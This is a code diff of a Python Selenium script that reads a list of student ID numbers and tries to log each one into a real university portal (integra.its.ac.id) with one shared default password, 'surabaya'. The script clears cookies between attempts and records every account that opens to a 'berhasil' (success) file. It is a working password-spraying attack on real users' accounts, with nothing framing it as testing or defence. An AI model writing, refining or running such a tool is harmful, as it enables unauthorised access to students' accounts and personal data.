@@ -1,14 +1,16 @@
-import time 
+import time, random
 import requests
 from selenium import webdriver 
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support import expected_conditions as EC 
-
+from selenium.webdriver.firefox.options import Options
 
 url = 'https://integra.its.ac.id/'
-driver = webdriver.Firefox(executable_path='../../geckodriver.exe')
+# driver = webdriver.Firefox(executable_path='../../geckodriver.exe')
+# driver = webdriver.PhantomJS(executable_path='../../phantomjs.exe')
+driver = webdriver.Chrome(executable_path='../../chromedriver.exe')
 
 driver.get(url) 
 with open('nrp.txt','r') as f: 
@@ -17,16 +19,13 @@ print('panjang awal: ',len(koleksi_nrp))
 koleksi_nrp = list(set(koleksi_nrp))
 print('panjang akhir: ', len(koleksi_nrp))
 
-koleksi_nrp.sort()
+def login(nrp): 
+    driver.find_element_by_name('userid').send_keys(nrp)
+    driver.find_element_by_name('password').send_keys('surabaya')
+    driver.find_element_by_name('password').send_keys(Keys.ENTER)
 
-def login(nrp, password): 
-    email = driver.find_element_by_id('userid')
-    pswd = driver.find_element_by_id('password')
-
-    email.send_keys(nrp)
-    pswd.send_keys(password)
-
-    pswd.send_keys(Keys.ENTER)
+    # driver.find_elements_by_xpath('//*[@id="login_form"]/div[3]/button').click()
+    # email.send_keys(Keys.ENTER)
 
 def logout(): 
     selectelement = driver.find_element_by_id('navbarDropdown')
@@ -41,20 +40,17 @@ i = 0
 jumlah_berhasil = 0
 
 for nrp in koleksi_nrp: 
+    nrp = nrp.strip()
+    driver.delete_all_cookies()
+    wait_til('//*[@id="password"]')
+    login(nrp)
+
     i+=1
-    try:
-        wait_til('/html/body/div/div/div[2]/div/div[3]/div[4]/div/form/div[3]/button')
-        login(nrp, 'surabaya')
-    except: 
-        pass
     try: 
         # wait_til('//*[@id="navbarDropdown"]')
-        driver.delete_all_cookies()
         time.sleep(.5)
         body = driver.find_element(By.TAG_NAME,'body')
-        # print(body.text)
-        body = body.text
-        if 'SI Beasiswa' in body:  
+        if 'SI Beasiswa' in body.text:  
             with open('berhasil.txt','a') as f: 
                 f.writelines(nrp+'\n')
             logout()    
@@ -64,6 +60,7 @@ for nrp in koleksi_nrp:
             continue
         else: 
             print(nrp, 'gagal dari if')
+            driver.delete_all_cookies()
     except: 
         print(nrp,'gagal')
         driver.delete_all_cookies()
